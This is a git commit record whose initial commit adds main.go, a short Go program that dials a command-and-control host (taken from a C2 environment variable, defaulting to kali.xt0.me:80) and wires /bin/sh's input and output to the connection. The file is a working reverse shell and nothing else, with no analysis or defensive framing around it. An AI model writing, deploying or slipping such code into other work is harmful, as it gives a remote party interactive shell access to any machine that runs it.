f2cdd6dfae25e2a6143b7a4c75e943758c1bf34d
Chris <terraform@xt0.me>
2021-08-31 10:36:08 +0700

    Initial commit

---
+++ main.go
@@ -0,0 +1,29 @@
+package main
+
+import (
+	"log"
+	"net"
+	"os"
+	"os/exec"
+)
+
+func connect(c2 string) {
+	c, err := net.Dial("tcp", c2)
+	if nil != err {
+		log.Fatalf("Could not open TCP connection")
+	}
+	defer c.Close()
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin = c
+	cmd.Stdout = c
+	cmd.Stderr = c
+	cmd.Run()
+}
+
+func main() {
+	c2 := os.Getenv("C2")
+	if c2 == "" {
+		c2 = "kali.xt0.me:80"
+	}
+	connect(c2)
+}
